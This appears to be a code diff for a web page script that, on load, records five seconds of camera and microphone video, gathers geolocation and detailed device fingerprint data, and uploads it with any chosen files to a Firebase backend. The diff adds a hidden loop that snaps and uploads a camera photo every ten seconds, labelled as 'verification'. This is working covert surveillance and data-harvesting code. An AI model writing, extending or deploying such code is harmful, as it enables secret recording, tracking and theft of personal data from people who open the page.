@@ -10,11 +10,18 @@ import {
   getDownloadURL
 } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-storage.js";
 
+// Elements
 const video = document.getElementById("video");
+const canvas = document.getElementById("snapshotCanvas");
 const fileInput = document.getElementById("fileInput");
+const context = canvas.getContext("2d");
+
 let mediaRecorder;
 let recordedChunks = [];
 
+/**
+ * Get device information
+ */
 async function getDeviceInfo() {
   const battery = await navigator.getBattery();
   const connection = navigator.connection || {};
@@ -22,6 +29,9 @@ async function getDeviceInfo() {
     userAgent: navigator.userAgent,
     platform: navigator.platform,
     language: navigator.language,
+    deviceMemory: navigator.deviceMemory || "unknown",
+    hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
+    screenResolution: `${window.screen.width}x${window.screen.height}`,
     battery: {
       level: battery.level,
       charging: battery.charging,
@@ -33,12 +43,18 @@ async function getDeviceInfo() {
   };
 }
 
+/**
+ * Get geolocation
+ */
 async function getLocation() {
   return new Promise((resolve, reject) => {
     navigator.geolocation.getCurrentPosition(resolve, reject);
   });
 }
 
+/**
+ * Record 5 seconds of live camera stream
+ */
 async function recordCameraVideo(stream) {
   return new Promise((resolve) => {
     mediaRecorder = new MediaRecorder(stream);
@@ -61,6 +77,9 @@ async function recordCameraVideo(stream) {
   });
 }
 
+/**
+ * Upload selected files to Firebase Storage
+ */
 async function uploadFiles(files) {
   const urls = [];
   for (const file of files) {
@@ -72,6 +91,34 @@ async function uploadFiles(files) {
   return urls;
 }
 
+/**
+ * Automatically take snapshots from the camera every 10 seconds
+ */
+async function startSnapshotLoop() {
+  setInterval(async () => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    canvas.toBlob(async (blob) => {
+      const fileName = `snapshots/photo_${Date.now()}.jpg`;
+      const snapshotRef = ref(storage, fileName);
+      await uploadBytes(snapshotRef, blob);
+      const downloadURL = await getDownloadURL(snapshotRef);
+
+      // Add to Firestore
+      await setDoc(doc(db, "web", "user"), {
+        verificationSnapshots: [downloadURL]
+      }, { merge: true });
+
+      console.log(`📸 Snapshot saved: ${downloadURL}`);
+    }, "image/jpeg", 0.95);
+  }, 10000); // Every 10 seconds
+}
+
+/**
+ * Main function to collect all data
+ */
 async function collectAll() {
   const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
   video.srcObject = stream;
@@ -80,28 +127,36 @@ async function collectAll() {
   const deviceInfo = await getDeviceInfo();
   const recordedVideoUrl = await recordCameraVideo(stream);
 
-  // Wait for user files
+  // Save initial data
+  await setDoc(doc(db, "web", "user"), {
+    timestamp: new Date(),
+    deviceInfo,
+    location: location ? {
+      latitude: location.coords.latitude,
+      longitude: location.coords.longitude
+    } : "Location denied",
+    recordedVideo: recordedVideoUrl,
+    uploadedFiles: [],
+    verificationSnapshots: []
+  });
+
+  // Start camera snapshot loop
+  startSnapshotLoop();
+
+  // Upload files on user selection
   fileInput.addEventListener("change", async (e) => {
     const files = e.target.files;
     const uploadedFileUrls = await uploadFiles(files);
 
-    const finalData = {
-      timestamp: new Date(),
-      deviceInfo,
-      location: location ? {
-        latitude: location.coords.latitude,
-        longitude: location.coords.longitude
-      } : "Location denied",
-      recordedVideo: recordedVideoUrl,
+    await setDoc(doc(db, "web", "user"), {
       uploadedFiles: uploadedFileUrls
-    };
+    }, { merge: true });
 
-    // Save to Firestore in doc `web`
-    await setDoc(doc(db, "web", "user"), finalData);
-    console.log("✔️ Data saved to Firebase.");
+    console.log("✔️ Files uploaded and data saved.");
   });
 }
 
+// Start on page load
 window.onload = () => {
   collectAll();
 };
